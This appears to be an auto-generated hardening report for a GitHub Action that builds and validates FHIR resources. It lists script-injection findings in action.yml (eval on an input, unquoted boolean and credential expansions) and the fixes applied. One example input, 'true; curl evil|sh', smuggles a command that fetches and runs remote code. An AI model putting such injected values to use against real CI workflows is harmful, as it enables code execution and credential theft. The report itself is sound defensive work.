<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.9.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.9.2** was hardened automatically. 8 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b), step 'Download Java Validator'. The input JAVA_VALIDATOR_DOWNLOAD_LOCATION is passed through eval with `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`, so any `$(...)`, backticks or `;` in the input runs as a shell command. The result is then expanded unquoted in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`. Fix: replace the eval with a literal substitution of $JAVA_VALIDATOR_VERSION (for example `${JAVA_VALIDATOR_DOWNLOAD_LOCATION//\$JAVA_VALIDATOR_VERSION/$JAVA_VALIDATOR_VERSION}`) and double-quote the URL.

Locations:

- `action.yml:729`
- `action.yml:733`

### script-injection (severity: high)

Rule (b): boolean inputs are run as commands without quotes. Many steps use the pattern `if $INPUT_DOTNET_VALIDATION_ENABLED; then`, `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES`, `if $INPUT_SUSHI_ENABLED`, `if $INPUT_JAVA_VALIDATION_ENABLED`, `if $INPUT_JAVA_SNAPSHOT_ENABLED`, `if $CLOSE_SLICING_FOR_VALIDATION`. The shell runs each input's value as a command, so a value like `true; curl evil|sh` gets executed. Fix: compare quoted strings instead, e.g. `if [[ "$INPUT_DOTNET_VALIDATION_ENABLED" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:168`
- `action.yml:183`
- `action.yml:285`

### script-injection (severity: high)

Rule (b), step 'Install Firely.Terminal': an input is expanded without quotes in `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null`.

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b), step 'Simplifier login': credential inputs are expanded without quotes in `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b), step 'Install fsh-sushi': an input is expanded without quotes in `sudo npm install -g fsh-sushi@$SUSHI_VERSION`, which runs as root.

Locations:

- `action.yml:547`

### script-injection (severity: high)

Rule (b), steps 'Generate conformance resources with SUSHI' and 'Re-run SUSHI to restore conformance resources after slicing modification': an input is expanded without quotes in `sushi $INPUT_SUSHI_OPTIONS`. Use a bash array, or the guarded form for a single optional argument.

Locations:

- `action.yml:564`
- `action.yml:935`

### script-injection (severity: high)

Rule (b), step 'Run Quality Control checks': inputs are expanded without quotes in `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`. Use the guarded form `${INPUT_PATH_TO_QUALITY_CONTROL_RULES:+"$INPUT_PATH_TO_QUALITY_CONTROL_RULES"}` for the optional argument.

Locations:

- `action.yml:668`
- `action.yml:669`

### script-injection (severity: high)

Rule (b), steps 'Validate all conformance resources in scope of the repository' and 'Validate all example resources in scope of the repository': inputs are expanded without quotes in `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...` and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml $GITHUB_WORKSPACE/$p*.json -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES ...`.

Locations:

- `action.yml:801`
- `action.yml:886`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

All changes are in action.yml:
- Replaced the eval in 'Download Java Validator' with a plain text substitution of $JAVA_VALIDATOR_VERSION. Both the $VAR and ${VAR} spellings are handled. The URL passed to wget is now double-quoted.
- Every check that ran a boolean input as a command (`if $X; then`) now compares the quoted value to the string "true".
- Quoted the single values: the Firely Terminal and SUSHI versions, the Simplifier email/password arguments, the fhir cache path passed to rm -rf, and FHIR_VERSION. The optional quality-control rules path uses ${VAR:+"$VAR"}, so no empty argument is passed when it's unset. EXPECTED_FAILS is now checked with printf '%s\n' "..." | grep -w.
- Inputs that hold a list (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES) and the IG dependency list taken from package.json are split into bash arrays on whitespace (`read -r -d '' -a` with an empty-value guard and `|| true`). That is the same split upstream's unquoted expansion did. The -ig parameter lists are now arrays too. The *.xml/*.json patterns in the Java validator command still expand as before.
- One side effect: the array split doesn't expand wildcards, which upstream's unquoted $VAR did. A wildcard pattern typed into one of these list inputs will now reach the tool as literal text instead of being expanded by the shell.
- Problem along the way: running several replace-all edits on the file in parallel garbled parts of it. I rewrote the whole file from the original with every fix applied, and a final search found none of the old patterns left.

### Iteration 2

**Fixes applied:** github-env-injection

**Notes:**

In action.yml, the 'Detect FHIR version' step now passes fhirVersion through printf '%s' | tr -d '\n\r' before it writes FHIR_VERSION to $GITHUB_ENV.

